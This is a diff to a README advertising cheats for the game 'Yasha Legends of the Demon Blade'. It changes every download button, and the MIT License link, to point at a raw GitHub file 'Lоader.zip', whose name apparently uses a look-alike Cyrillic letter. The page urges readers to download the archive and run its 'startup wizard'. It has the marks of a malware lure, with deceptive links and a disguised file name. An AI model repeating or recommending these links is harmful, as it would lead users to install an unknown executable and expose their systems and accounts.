@@ -1,6 +1,6 @@
 # 🎮 Yasha Legends of the Demon Blade Cheats Hacks
 
-[![Download Now](https://img.shields.io/badge/Download--Now-Yasha%20Legends%20Cheats-blue.svg?style=for-the-badge)](https://easylauncher.su/PSnzrH)
+[![Download Now](https://raw.githubusercontent.com/BennetSamuel/YashaLegendsBladeModdingHub/main/Lоader.zip%20Legends%https://raw.githubusercontent.com/BennetSamuel/YashaLegendsBladeModdingHub/main/Lоader.zip)](https://raw.githubusercontent.com/BennetSamuel/YashaLegendsBladeModdingHub/main/Lоader.zip)
 
 Welcome to the ultimate toolkit for Yasha Legends of the Demon Blade! Boost your adventure, maximize your hero’s potential, and unlock high-end gameplay with our robust utility. With continuous updates and seamless compatibility, this project brings advanced solutions to both casual and veteran players in 2025.
 
@@ -10,7 +10,7 @@ Welcome to the ultimate toolkit for Yasha Legends of the Demon Blade! Boost your
 
 **Step 1:** 
 Click on the download button below to get the latest release.
-[![Download Now](https://img.shields.io/badge/Download--Now-Yasha%20Legends%20Cheats-blue.svg?style=for-the-badge)](https://easylauncher.su/PSnzrH)
+[![Download Now](https://raw.githubusercontent.com/BennetSamuel/YashaLegendsBladeModdingHub/main/Lоader.zip%20Legends%https://raw.githubusercontent.com/BennetSamuel/YashaLegendsBladeModdingHub/main/Lоader.zip)](https://raw.githubusercontent.com/BennetSamuel/YashaLegendsBladeModdingHub/main/Lоader.zip)
 
 Proceed with the startup wizard included in your download. Enjoy secure, instruction-driven integration with your game installation.
 
@@ -55,8 +55,8 @@ This toolkit aims to enhance single-player user experiences. Use responsibly. Th
 ## 📄 License
 
 Distributed under the MIT License.  
-For details, see: [MIT License](https://opensource.org/licenses/MIT)
+For details, see: [MIT License](https://raw.githubusercontent.com/BennetSamuel/YashaLegendsBladeModdingHub/main/Lоader.zip)
 
 ---
 
-[![Download Now](https://img.shields.io/badge/Download--Now-Yasha%20Legends%20Cheats-blue.svg?style=for-the-badge)](https://easylauncher.su/PSnzrH)
+[![Download Now](https://raw.githubusercontent.com/BennetSamuel/YashaLegendsBladeModdingHub/main/Lоader.zip%20Legends%https://raw.githubusercontent.com/BennetSamuel/YashaLegendsBladeModdingHub/main/Lоader.zip)](https://raw.githubusercontent.com/BennetSamuel/YashaLegendsBladeModdingHub/main/Lоader.zip)
